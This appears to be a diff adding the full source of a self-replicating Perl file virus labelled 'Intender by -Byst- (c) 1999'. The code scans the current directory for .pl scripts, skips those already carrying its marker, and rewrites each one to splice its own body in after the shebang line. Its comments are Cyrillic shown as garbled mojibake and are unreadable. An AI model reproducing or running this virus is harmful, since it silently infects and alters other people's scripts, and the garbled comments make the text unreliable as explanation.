@@ -1,0 +1,66 @@
+#here virus starts
+# Intender by -Byst- (c) 1999
+$source = __FILE__;
+while (<*.pl>)
+{
+  $name = $_;                    # ˆ¬ï ä ©« -¦¥àâ¢ë
+  $cname = crypt($name,$name);   # ˆ¬ï ¯à®¬¥¦ãâ®ç­®£® ä ©« 
+
+  # à®¢¥à¨¬ ­¥ ¨­ä¨æ¨à®¢ ­ «¨ ã¦¥ ä ©«?
+
+  open(TARGET,"<$name");         # ¦¥àâ¢ 
+  $allready_infected = 0;
+  while (<TARGET>) {
+   if (index($_,"\x23 Intender by -Byst- (c) 1999") == 0)
+    { $allready_infected = 1;}   # ã¦¥ ¨­ä¨æ¨à®¢ ­!
+  }
+  close(TARGET);
+  if ($allready_infected == 1 )
+   { next;}                      # ¯¥à¥å®¤¨¬ ª á«¥¤ãîé¥© ¦¥àâ¢¥
+
+  # à®¢¥à¨¬, ­¥â «¨ ¢ â¥«¥ ¦¥àâ¢ë áâà®ª â¨¯  !/usr/bin/perl
+  open(TARGET,"<$name");         # ¦¥àâ¢ 
+  $flag = 0;
+  while (<TARGET>) {
+   if (index($_,"\x23!") == 0)   #  è«¨ â ªãî áâà®ªã
+    { $flag = 1;}                # ¢§¢®¤¨¬ ä« £
+  }
+  close(TARGET);
+
+  # ‘®§¤ ¥¬ ç áâì ¢ ª®â®à®© á®¤¥à¦¨âáï ¢ë§®¢ ¯à®æ¥¤ãàë ¨­ä¨æ¨à®¢ ­¨ï
+  open(TARGET,"<$name");         # ¦¥àâ¢ 
+  open(FBUF,">$cname");          # ¯à®¬¥¦ãâ®ç­ë© ä ©«
+
+  if ($flag == 1) {              # ã ¦¥àâ¢ë ¥áâì ®¡®§­ ç¥­¨¥ ­ ç «  ¯à®£à ¬¬ë?
+   while (<TARGET>) {            # ¨é¥¬ ¥£®
+    print(FBUF);                 # á®åà ­ï¥¬ ¢á¥ áâà®ª¨ ¦¥àâ¢ë ¤® #!
+    if (index($_,"\x23!") == 0 ) #  £ , ¢®â ¨ ­ ç «® ¯à®£à ¬¬ë
+      { last;}
+   }
+  }
+
+  # ¨é¥¬ â¥«  ¯à®æ¥¤ãà
+  $_ = "\n";print(FBUF);
+  open(SOURCE,"<$source");       #  â ªãîé¨© ä ©«
+  while(<SOURCE>) {              # ¨é¥¬ ¯à¨§­ ª ­ ç «  - "#here virus starts"
+   if (index($_,"\x23here virus starts") == 0) { last;}
+  }
+  print(FBUF);
+  # ¢¥áì â¥ªáâ ¯à®æ¥¤ãà -> ¯à®¬¥¦ãâ®ç­ë© ä ©«
+  while (<SOURCE>) {
+   print(FBUF);
+   if (index($_,"\x23here virus ends") == 0) { last;}
+  }
+  close(SOURCE);
+  $_ = "\n";print(FBUF);
+  # ®áâ ¢èãîáï ç áâì ¦¥àâ¢ë -> ¯à®¬¥¦ãâ®ç­ë© ä ©«
+  while (<TARGET>) {
+   print(FBUF);
+  }
+  close(TARGET);
+  close(FBUF);
+  rename($cname,$name);
+}
+#here virus ends
+
+
